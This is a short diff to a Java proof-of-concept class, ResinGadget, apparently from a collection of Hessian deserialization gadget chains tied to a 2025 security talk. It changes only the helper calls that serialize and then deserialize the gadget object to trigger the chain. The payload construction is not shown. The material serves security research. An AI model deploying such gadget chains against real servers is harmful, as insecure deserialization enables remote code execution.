@@ -25,8 +25,8 @@ import static com.test.gadget.blackhat2025.XStringFSB2toString.unhash;
 public class ResinGadget {
     public static void main(String[] args) throws Exception {
         Object object = getObject();
-        byte[] bytes = HessianTools.hessian2Ser2bytes(object);
-        HessianTools.hessian2Deser(bytes);
+        byte[] bytes = HessianTools.hessianSer2bytes(object, "2");
+        HessianTools.hessianDeser(bytes, "2");
     }
 
     public static Object getObject() throws Exception {
